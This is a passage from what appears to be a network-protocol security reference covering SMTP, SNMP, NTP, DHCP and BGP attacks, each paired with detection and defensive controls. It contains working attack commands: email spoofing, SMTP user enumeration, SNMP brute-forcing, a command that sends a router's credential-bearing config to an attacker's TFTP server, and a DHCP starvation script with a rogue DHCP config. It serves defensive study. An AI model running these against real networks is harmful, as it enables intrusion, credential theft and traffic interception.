Server: 250 OK

Client: RCPT TO:<bob@recipient.com>
Server: 250 OK

Client: DATA
Server: 354 Start mail input

Client: From: Alice <alice@sender.com>
        To: Bob <bob@recipient.com>
        Subject: Test

        Body text.
        .
Server: 250 OK: queued

Client: QUIT
Server: 221 Bye
```

**IMAP** (port 993/143): Stateful protocol; email remains on server; supports folders and flags.
**POP3** (port 995/110): Downloads and deletes from server; legacy, single-device model.

### Attack Techniques

#### Open Relay Exploitation — T1566.002, T1114

An open relay accepts and forwards mail from any source to any destination — used for spam and phishing.

```bash
# Test for open relay via telnet
telnet mail.target.com 25
EHLO test.com
MAIL FROM:<test@test.com>
RCPT TO:<victim@gmail.com>
DATA
Subject: Relay test
Test
.
QUIT
# If 250 OK returned for RCPT TO external domain -> open relay confirmed

# Automated check
nmap -p 25 --script smtp-open-relay mail.target.com
```

#### SMTP User Enumeration — T1087.003

```bash
# VRFY command
telnet mail.target.com 25
VRFY alice
# 252 = exists, 550 = doesn't exist

# EXPN command (expands mailing lists)
EXPN administrators

# RCPT TO method (works even when VRFY/EXPN disabled)
MAIL FROM:<test@test.com>
RCPT TO:<admin@target.com>
# 250 = user exists, 550 = doesn't exist

# Automated enumeration
smtp-user-enum -M RCPT -U users.txt -D target.com -t mail.target.com
```

#### Email Spoofing and BEC — T1566.001, T1534

Without SPF, DKIM, and DMARC, any server can send email claiming to be from any domain.

```bash
# Send spoofed email (if target mail server lacks SPF enforcement)
swaks --to victim@target.com --from ceo@target.com \
      --server mail.target.com \
      --header "Subject: Urgent wire transfer"

# Check SPF, DKIM, DMARC
dig +short TXT target.com | grep spf
dig +short TXT _dmarc.target.com
```

Business Email Compromise (BEC) uses spoofed or lookalike domains to impersonate executives and redirect wire transfers. FBI IC3 reports $3B+ annually in BEC losses.

#### Email Header Injection

Unsanitized `\r\n` in user-controlled fields (name, address) in SMTP headers allows injecting additional headers or body content.

### Detection

| Signal | Log Source | Indicator |
|--------|-----------|-----------|
| Open relay use | SMTP server logs | Outbound mail from external source IPs |
| User enumeration | SMTP logs | VRFY/EXPN commands, 252/550 pattern |
| Spoofing | Email gateway | SPF/DKIM/DMARC failure headers |
| BEC | Email DLP, user reports | External domain impersonating internal exec |
| Credential spray | Auth logs (O365/Exchange) | Many failed logins from single IP |

### Defensive Controls

- **SPF**: Publish TXT record listing authorized sending IPs; `v=spf1 include:sendgrid.net ~all`.
- **DKIM**: Cryptographically sign outbound mail; `v=DKIM1; k=rsa; p=<pubkey>`.
- **DMARC**: Policy for SPF/DKIM failures; `v=DMARC1; p=reject; rua=mailto:dmarc@corp.com` — enforce `p=reject`.
- **Disable VRFY/EXPN**: `smtpd_disable_vrfy_command = yes` (Postfix); prevents user enumeration.
- **Require authentication**: `smtpd_relay_restrictions = permit_sasl_authenticated, reject` — no open relay.
- **STARTTLS / SMTPS**: Encrypt in transit; use TLS 1.2+ only.
- **Anti-spoofing in email gateway**: Block external mail claiming to be from internal domain.
- **MFA on email accounts**: Priority target for credential stuffing (O365, G Suite).

---

## SNMP (161/162 UDP)

### How It Works

SNMP (Simple Network Management Protocol) allows monitoring and configuration of network devices. Components:

- **Manager**: NMS (Network Management Station) polls devices.
- **Agent**: Runs on device; responds to queries.
- **MIB** (Management Information Base): Tree-structured data model; OIDs identify each metric.
- **Traps**: Unsolicited alerts from agent to manager (port 162).

Protocol versions:
- **SNMPv1/v2c**: Community string authentication (cleartext); no encryption.
- **SNMPv3**: Username/password authentication (HMAC-MD5/SHA); AES encryption.

Default community strings: `public` (read), `private` (write).

### Attack Techniques

#### Community String Brute Force — T1110.001

```bash
# Scan for SNMP
nmap -sU -p 161 --script snmp-info 10.0.0.0/24

# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
            -i targets.txt
hydra -P community_strings.txt -v snmp://192.168.1.1

# Using metasploit
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 10.0.0.0/24
run
```

#### MIB Walk — T1082, T1016

Once a valid community string is found, walk the entire MIB for device configuration, network topology, and credentials.

```bash
# Full MIB walk
snmpwalk -v2c -c public 192.168.1.1

# Specific OIDs
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1    # System info
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.20  # IP addresses
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21  # Routing table
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.6.13  # TCP connections
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.9      # Cisco-specific MIBs

# Enumerate Windows hosts via SNMP
snmp-check -c public -v 2c 192.168.1.100
# Returns: users, processes, software, shares, services, network info
```

#### Write Access Exploitation — T1565.003

SNMP write access (`private` community or SNMPv3 write user) allows configuration modification:

```bash
# Set a configuration value
snmpset -v2c -c private 192.168.1.1 \
  sysContact.0 s "hacked@evil.com"

# More dangerous: Cisco IOS config retrieval via tftp OID
snmpset -v2c -c private 192.168.1.1 \
  enterprises.9.2.1.55.192.168.1.50 s router-config.txt
# Sends running config to TFTP server (contains credentials)
```

### Detection

| Signal | Log Source | Indicator |
|--------|-----------|-----------|
| Community string scan | Firewall, IDS | Many SNMP GET-REQUEST with different community strings |
| MIB walk | NetFlow | Rapid sequential OID requests, large SNMP response volumes |
| Write access | SNMP agent logs | SET operations, config changes via SNMP |
| Unauthorized source | Firewall | SNMP from non-NMS IPs |

### Defensive Controls

- **Deploy SNMPv3**: Use `authPriv` security level (both authentication and encryption); algorithms SHA-256 + AES-128 minimum.
- **Change default community strings**: Never use `public`/`private`; use long random strings or eliminate SNMPv1/v2c entirely.
- **Firewall port 161/162**: Block SNMP from all sources except the NMS IP; UDP only needed between device and NMS.
- **Read-only SNMP**: Separate read-only and read-write access; most monitoring needs only read.
- **ACL on SNMP agent**: Restrict to NMS IP address on the device itself.
- **Inventory and audit**: Identify all SNMP-enabled devices; migrate to SNMPv3.

---

## NTP (123 UDP)

### How It Works

NTP (Network Time Protocol) synchronizes clocks across the internet using a hierarchical stratum system:

- **Stratum 0**: Atomic clocks, GPS receivers (reference clocks — not directly on network).
- **Stratum 1**: Servers directly connected to Stratum 0 (e.g., `time.nist.gov`).
- **Stratum 2+**: Servers synchronized from the stratum above.

NTP uses UDP port 123. The protocol uses timestamps and round-trip delay calculation to achieve sub-millisecond synchronization. NTPv4 supports cryptographic authentication.

### Attack Techniques

#### NTP Amplification — CVE-2013-5211, T1498.002

The `monlist` command (MON_GETLIST) returns the last 600 hosts that synchronized with the server. A 234-byte request generates a ~48KB response — a 557x amplification factor.

```bash
# Check if monlist is enabled (vulnerable)
ntpdc -c monlist ntp.target.com

# Verify with nmap
nmap -sU -p 123 --script ntp-monlist ntp.target.com
```

Mitigation: Upgrade to NTPd 4.2.7p26+ or disable monlist (`noquery` restriction). BCP38 prevents IP spoofing that makes amplification attacks possible.

#### NTP Time Manipulation — T1565.002

Kerberos authentication requires clocks within **5 minutes** of the KDC. An attacker who can manipulate time can:
- Replay expired Kerberos tickets.
- Cause authentication failures (denial of service).
- Manipulate log timestamps to obscure attack timeline.

Detection: Sudden large time jumps in NTP sync (>step threshold), multiple NTP sources disagreeing, unexpected NTP server changes.

### Defensive Controls

- **Disable monlist**: Add `restrict default noquery` to `ntp.conf`; or upgrade to NTPd >= 4.2.7p26.
- **BCP38**: ISP-level ingress filtering prevents UDP source spoofing used in amplification.
- **NTPv4 symmetric key or autokey authentication**: Prevents rogue NTP server attacks.
- **Multiple NTP sources**: Minimum 4 sources for fault tolerance and anomaly detection.
- **Network Time Security (NTS)**: RFC 8915 -- TLS-authenticated NTP for public servers.
- **Firewall NTP**: Allow only to/from trusted NTP servers; block external UDP/123 to internal hosts.
- **Monitor time skew**: Alert on >1-minute drift from authoritative sources.

---

## DHCP (67/68 UDP)

### How It Works

DHCP automates IP address assignment via the **DORA** process:

```
1. DISCOVER: Client broadcasts on 255.255.255.255 (no IP yet)
             "Who is a DHCP server? I need an address."
             (Source: 0.0.0.0, Dest: 255.255.255.255)

2. OFFER:    Server unicasts/broadcasts an available IP lease offer
             "Here: 192.168.1.100, subnet /24, lease 24h, GW 192.168.1.1, DNS 8.8.8.8"

3. REQUEST:  Client broadcasts acceptance of the offer
             "I accept 192.168.1.100 from server 192.168.1.1"

4. ACK:      Server confirms the lease
             "Confirmed. You have 192.168.1.100 for 24 hours."
```

DHCP also distributes: default gateway, DNS servers, NTP servers (option 42), TFTP server (option 66), domain name, and more.

### Attack Techniques

#### DHCP Starvation — T1499.002

Flood the DHCP server with DISCOVER packets using spoofed MAC addresses to exhaust the IP address pool, then deploy a rogue DHCP server.

```bash
# Yersinia (requires root/CAP_NET_RAW)
yersinia dhcp -attack 1  # DHCP starvation

# dhcpig
python dhcpig.py -i eth0

# scapy
from scapy.all import *
for i in range(256):
    pkt = Ether(src=RandMAC())/IP(src="0.0.0.0",dst="255.255.255.255")/\
          UDP(sport=68,dport=67)/BOOTP(chaddr=RandMAC())/DHCP(options=[("message-type","discover"),"end"])
    sendp(pkt, iface="eth0")
```

#### Rogue DHCP Server — T1557, T1071.001

After starvation (or without it on a network without DHCP snooping), deploy a rogue server that issues attacker-controlled gateway and DNS to all new DHCP clients — enabling MITM for all traffic.

```bash
# dnsmasq rogue DHCP server
cat > /tmp/rogue-dhcp.conf << EOF
interface=eth0
dhcp-range=192.168.1.200,192.168.1.250,12h
dhcp-option=3,192.168.1.50       # Rogue gateway
dhcp-option=6,192.168.1.50       # Rogue DNS server
EOF

dnsmasq -C /tmp/rogue-dhcp.conf --no-daemon

# Simultaneously run a MITM or DNS spoofer on 192.168.1.50
# All clients getting DHCP from rogue server will route through attacker
```

Detection: Multiple DHCP servers answering on the same segment, unexpected gateway/DNS in DHCP ACK, DHCP starvation (hundreds of DISCOVER packets with different MAC addresses).

### Defensive Controls

- **DHCP Snooping**: Switch feature that only allows DHCP responses (OFFER/ACK) from trusted uplink ports. Blocks rogue DHCP servers on access ports. Configure on all access layer switches.
- **Dynamic ARP Inspection (DAI)**: Uses DHCP snooping binding table to validate ARP packets; prevents ARP spoofing after rogue DHCP.
- **IP Source Guard**: Drops traffic from IPs not in the DHCP snooping table; prevents starvation via false MACs.
- **Port Security**: Limit MAC addresses per switch port to prevent MAC flooding used in starvation.
- **802.1X (NAC)**: Authenticate endpoints before allowing network access; rogue devices cannot participate.
- **DHCP rate limiting**: Limit DISCOVER packets per port per second.
- **Monitoring**: Alert on new DHCP server responses, large volumes of DISCOVER packets, DHCP pool exhaustion.

---

## BGP (179 TCP)

### How It Works

BGP (Border Gateway Protocol) is the internet's inter-domain routing protocol. Autonomous Systems (ASes) exchange reachability information via BGP.

Key concepts:
- **AS_PATH**: Loop prevention; routes with your own ASN in the path are rejected.
- **eBGP**: Between different ASes; routes undergo AS_PATH prepending.
- **iBGP**: Within the same AS; full mesh or route reflectors.
- **Prefix advertisement**: ASes announce the IP prefixes they own (e.g., AS15169 announces 8.8.8.0/24).
- **Best path selection**: Based on AS_PATH length, MED, LOCAL_PREF, origin type.
- **BGP sessions**: TCP 179, MD5-authenticated in most deployments.

### Attack Techniques

#### BGP Prefix Hijacking — T1584.007, T1557

An AS advertises prefixes it does not legitimately own — either accidentally (misconfiguration) or maliciously. Routers prefer more-specific prefixes (longer prefix length).

```
Legitimate: AS15169 announces 8.8.8.0/24
Attack:     AS_EVIL announces 8.8.8.0/25 (more specific -> preferred by most routers)
Result:     Traffic destined for 8.8.8.0/25 routes to AS_EVIL instead of Google
```

High-profile incidents:
- **2010 China Telecom**: AS4134 originated 37,000 prefixes for 18 minutes, affecting YouTube, US government, and others.
- **2022 KlaySwap (Kakaotalk)**: BGP hijack of Kakao's DNS provider used to steal $1.9M in crypto.

#### BGP Route Leaks

A route leak occurs when an AS re-announces routes it should not -- typically advertising routes learned from a peer to another peer or upstream.

- **2019 Cloudflare/Verizon**: DQE Communications leaked 212 routes through Allegheny Technologies to Verizon, which propagated globally, making Cloudflare briefly unreachable for millions.
- **2010 Moratel**: Leaked Google prefixes, causing outages.

#### Prefix Hijacking for Certificate Theft

BGP hijacking can intercept ACME `http-01` domain validation challenges, allowing an attacker to obtain legitimate TLS certificates for hijacked domains. Demonstrated by researchers at Princeton (2018).

```
1. Attacker hijacks prefix containing domain's authoritative DNS server
2. ACME CA queries attacker's DNS -> returns attacker's IP for http-01 challenge
3. CA validates challenge against attacker's server -> issues valid cert
4. Attacker now has legitimate cert + can MITM HTTPS for that domain
```

Mitigation: DNSSEC + Multi-Perspective Validation (Let's Encrypt issues from multiple vantage points).

### Detection

| Signal | Source | Indicator |
|--------|--------|-----------|
| Prefix hijacking | BGP monitoring (BGPmon, RIPE RIS) | Unexpected origin AS for prefix; new more-specific announcement |
| Route leak | BGP looking glasses, peerlock | Routes appearing in wrong ASes; full table from transit provider |
| Session tampering | Router logs | TCP RST on port 179; BGP session reset; unexpected peer |

Tools: BGPmon, RIPE BGPlay, Cloudflare Radar BGP, Team Cymru BGP routing security services.

### Defensive Controls

- **RPKI (Resource Public Key Infrastructure)**: Cryptographically binds IP prefixes to their authorized origin AS via Route Origin Authorizations (ROAs). BGP routers with RPKI validation (ROV) drop INVALID routes. As of 2024, ~50% of global prefixes have valid ROAs.
  ```
  ROA: AS15169 is authorized to announce 8.8.8.0/24 (max /24)
  Attacker: AS_EVIL announces 8.8.8.0/25 -> RPKI INVALID -> dropped by validating routers
  ```
- **BGPsec**: Cryptographically signs AS_PATH; prevents path manipulation. Deployment is nascent due to performance overhead.
- **Route filtering / RPSL**: Define strict prefix filters using IRR (Internet Routing Registry) data; only accept expected prefixes from peers.
- **Max-prefix limits**: Shutdown BGP sessions that advertise more prefixes than expected (prevents leak propagation).
- **MANRS (Mutually Agreed Norms for Routing Security)**: Industry initiative; four actions: filtering, anti-spoofing (BCP38), coordination, global validation.
- **BGP MD5 session authentication**: Prevents session hijacking via TCP RST injection.
- **ASPA (Autonomous System Provider Authorization)**: Next-generation route leak prevention; AS authorizes its upstream providers.

---

## Protocol Quick Reference Card

| Protocol | Port(s) | Transport | Top Attacks | Key Defense | Detection Source | ATT&CK |
|----------|---------|-----------|-------------|-------------|-----------------|--------|
| **DNS** | 53 | UDP/TCP | Tunneling, amplification, hijacking, rebinding, subdomain takeover | RPZ, DNSSEC, DNS filtering, DoH/DoT | DNS resolver logs, Zeek dns.log | T1071.004, T1048.003, T1498.002 |
| **HTTP/S** | 80, 443 | TCP | SSRF (IMDS), request smuggling, HTTP/2 CONTINUATION flood, Slowloris | WAF, IMDSv2, timeout limits, input validation | WAF logs, access logs, server metrics | T1190, T1090, T1498.002 |
| **SMB** | 445 | TCP | EternalBlue (MS17-010), Pass-the-Hash, NTLM relay, brute force, share enum | Disable SMBv1, require signing, LAPS, block 445 at perimeter | Event 5140, 4624 Type 3, 4776 | T1210, T1550.002, T1557.001, T1135 |
| **Kerberos** | 88 | TCP/UDP | Kerberoasting, AS-REP Roasting, Golden Ticket, Silver Ticket, Pass-the-Ticket | AES enforcement, gMSA, FAST armoring, krbtgt rotation | Event 4769 (RC4), 4768 (PreAuth=0), 4771 | T1558.001-.004, T1550.003 |
| **LDAP** | 389, 636 | TCP | LDAP injection, anonymous bind enum, ldapdomaindump, LDAP relay | Require signing, disable anon bind, restrict to mgmt nets | Event 2889, Zeek ldap.log, bulk query alerts | T1087.002, T1069.002, T1557.001 |
| **RDP** | 3389 | TCP | BlueKeep (CVE-2019-0708), DejaBlue, brute force, session hijacking, PtH | NLA required, MFA, restrict source IPs, RDP Gateway | Event 4624 Type 10, 4625, 4778, TermServ 1149 | T1210, T1563.002, T1550.002 |
| **SSH** | 22 | TCP | Brute force, key theft, agent hijacking, port-forward tunneling | Keys only, FIDO2, disable agent forward, bastion host | auth.log, /var/log/secure, Zeek ssh.log | T1110.001, T1552.004, T1563.001, T1572 |
| **SMTP/IMAP** | 25, 587, 465, 993, 143 | TCP | Open relay, user enumeration (VRFY), email spoofing, BEC | SPF+DKIM+DMARC (reject), disable VRFY, require auth | SMTP gateway logs, email headers, auth logs | T1566.001, T1566.002, T1534, T1087.003 |
| **SNMP** | 161, 162 | UDP | Community string brute force, MIB walk, write-access config change | SNMPv3 authPriv, firewall to NMS only, no default strings | Firewall logs, IDS SNMP signatures, device logs | T1110.001, T1082, T1016, T1565.003 |
| **NTP** | 123 | UDP | monlist amplification (CVE-2013-5211, 557x), time manipulation (Kerberos skew) | Disable monlist, BCP38, NTPv4 auth, multiple sources | NetFlow (large UDP/123 responses), NTP sync logs | T1498.002, T1565.002 |
| **DHCP** | 67, 68 | UDP | Starvation (Yersinia/dhcpig), rogue DHCP server -> MITM | DHCP snooping, DAI, IP source guard, 802.1X NAC | Switch logs, DHCP server logs, ARP tables | T1499.002, T1557, T1071.001 |
| **BGP** | 179 | TCP | Prefix hijacking (more-specific), route leaks, cert theft via BGP+ACME | RPKI/ROV, route filters, max-prefix limits, MANRS | BGPmon, RIPE RIS, looking glasses, router logs | T1584.007, T1557 |

---

## Additional References

- [MITRE ATT&CK Network-Based Techniques](https://attack.mitre.org/matrices/enterprise/network/)
- [RFC 7858 -- DNS over TLS](https://datatracker.ietf.org/doc/html/rfc7858)
- [RFC 8484 -- DNS Queries over HTTPS](https://datatracker.ietf.org/doc/html/rfc8484)
- [MS17-010 -- EternalBlue Advisory](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2019-0708 -- BlueKeep](https://nvd.nist.gov/vuln/detail/CVE-2019-0708)
- [RPKI Resource Center -- RIPE NCC](https://www.ripe.net/manage-ips-and-asns/resource-management/rpki/)
- [MANRS -- Mutually Agreed Norms for Routing Security](https://www.manrs.org/)
- [Let's Encrypt Multi-Perspective Validation](https://letsencrypt.org/2020/02/19/multi-perspective-validation.html)
- [impacket -- Python network protocols library](https://github.com/SecureAuthCorp/impacket)
- [Responder -- LLMNR/NBT-NS/MDNS Poisoner](https://github.com/lgandx/Responder)
- [BloodHound -- AD Attack Path Analysis](https://github.com/BloodHoundAD/BloodHound)

---

*Part of the [TeamStarWolf Security Reference](README.md) | ATT&CK technique IDs reference [MITRE ATT&CK v15](https://attack.mitre.org/) | All tool commands for authorized security testing only*
